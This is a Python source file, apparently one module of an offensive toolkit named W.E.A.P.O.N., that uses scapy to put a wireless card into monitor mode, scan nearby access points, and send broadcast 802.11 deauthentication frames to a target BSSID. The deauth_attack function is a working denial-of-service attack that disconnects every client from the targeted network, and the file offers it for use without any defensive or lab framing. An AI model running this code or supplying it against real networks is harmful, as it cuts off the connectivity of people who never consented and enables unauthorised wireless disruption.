import subprocess
import argparse
import sys
import os
from scapy.all import *

def list_interfaces():
    try:
        output = subprocess.check_output(["iwconfig"], stderr=subprocess.DEVNULL).decode()
        print("[*] Available wireless interfaces:\n")
        for line in output.split('\n'):
            if "IEEE 802.11" in line:
                print("  -", line.split()[0])
    except Exception as e:
        print(f"[!] Failed to list interfaces: {e}")

def enable_monitor_mode(interface):
    print(f"[*] Enabling monitor mode on {interface}...")
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True)
        print(f"[+] Monitor mode enabled on {interface}\n")
    except Exception as e:
        print(f"[!] Failed to enable monitor mode: {e}")
        sys.exit(1)

def disable_monitor_mode(interface):
    print(f"[*] Restoring managed mode on {interface}...")
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "managed"], check=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True)
        print(f"[+] Managed mode restored on {interface}\n")
    except Exception as e:
        print(f"[!] Failed to disable monitor mode: {e}")

def get_channel(pkt):
    if pkt.haslayer(Dot11Elt):
        elt = pkt[Dot11Elt]
        while isinstance(elt, Dot11Elt):
            if elt.ID == 3:  # Channel
                return ord(elt.info)
            elt = elt.payload
    return None

def scan_access_points(interface):
    enable_monitor_mode(interface)
    print(f"[*] Scanning for access points on {interface}...\n")
    seen = set()

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            channel = get_channel(pkt)
            if bssid not in seen:
                print(f"[+] {ssid or '<Hidden>'} - {bssid} (CH: {channel})")
                seen.add(bssid)

    try:
        sniff(iface=interface, prn=packet_handler, timeout=15)
    finally:
        disable_monitor_mode(interface)

def deauth_attack(target_bssid, interface, count=10):
    print(f"[*] Sending {count} deauth packets to {target_bssid} via {interface}...\n")
    dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    sendp(packet, iface=interface, count=count, inter=0.2, verbose=1)

def main():
    parser = argparse.ArgumentParser(description="Wireless module for W.E.A.P.O.N.")
    parser.add_argument("--list", action="store_true", help="List wireless interfaces")
    parser.add_argument("--scan", metavar="iface", help="Scan for nearby APs")
    parser.add_argument("--deauth", nargs=2, metavar=("BSSID", "iface"), help="Send deauth packets")

    args = parser.parse_args()

    if args.list:
        list_interfaces()
    elif args.scan:
        scan_access_points(args.scan)
    elif args.deauth:
        bssid, iface = args.deauth
        deauth_attack(bssid, iface)
    else:
        parser.print_help()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] This module must be run as root.")
        sys.exit(1)

    main()
